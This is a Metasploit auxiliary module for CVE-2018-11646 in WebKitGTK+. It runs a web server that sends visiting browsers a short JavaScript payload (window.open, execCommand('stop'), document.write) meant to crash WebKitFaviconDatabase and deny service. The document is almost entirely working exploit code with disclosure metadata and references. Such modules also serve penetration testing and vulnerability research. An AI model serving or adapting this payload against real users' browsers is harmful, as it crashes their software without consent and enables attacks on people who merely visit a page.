# Title: WebKitGTK+ < 2.21.3 - &#039;WebKitFaviconDatabase&#039; DoS
# Author: Dhiraj Mishra
# Date: 2018-06-11
# CVE: 2018-11646
#
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpServer
 
  def initialize(info = {})
    super(
      update_info(
        info,
        &#039;Name&#039;           => "WebKitGTK+ WebKitFaviconDatabase DoS",
        &#039;Description&#039;    => %q(
          This module exploits a vulnerability in WebKitFaviconDatabase when pageURL is unset.
          If successful, it could lead to application crash, resulting in denial of service.
        ),
        &#039;License&#039;        => MSF_LICENSE,
        &#039;Author&#039;         => [
          &#039;Dhiraj Mishra&#039;, # Original discovery, disclosure
          &#039;Hardik Mehta&#039;,  # Original discovery, disclosure
          &#039;Zubin Devnani&#039;, # Original discovery, disclosure
          &#039;Manuel Caballero&#039; #JS Code
        ],
        &#039;References&#039; => [
          [&#039;EDB&#039;, &#039;44842&#039;],
          [&#039;CVE&#039;, &#039;2018-11646&#039;],
          [&#039;URL&#039;, &#039;https://bugs.webkit.org/show_bug.cgi?id=186164&#039;],
          [&#039;URL&#039;, &#039;https://datarift.blogspot.com/2018/06/cve-2018-11646-webkit.html&#039;]
        ],
        &#039;DisclosureDate&#039; => &#039;Jun 03 2018&#039;,
        &#039;Actions&#039;        => [[ &#039;WebServer&#039; ]],
        &#039;PassiveActions&#039; => [ &#039;WebServer&#039; ],
        &#039;DefaultAction&#039;  => &#039;WebServer&#039;
      )
    )
  end
 
  def run
    exploit # start http server
  end
 
  def setup
    @html = <<-JS
<script type="text/javascript">
 win = window.open("WIN", "WIN");
 window.open("http://example.com/", "WIN");
 win.document.execCommand(&#039;stop&#039;);
 win.document.write("HelloWorld");
 win.document.close();
</script>
    JS
  end
 
  def on_request_uri(cli, _request)
    print_status(&#039;Sending response&#039;)
    send_response(cli, @html)
  end
end

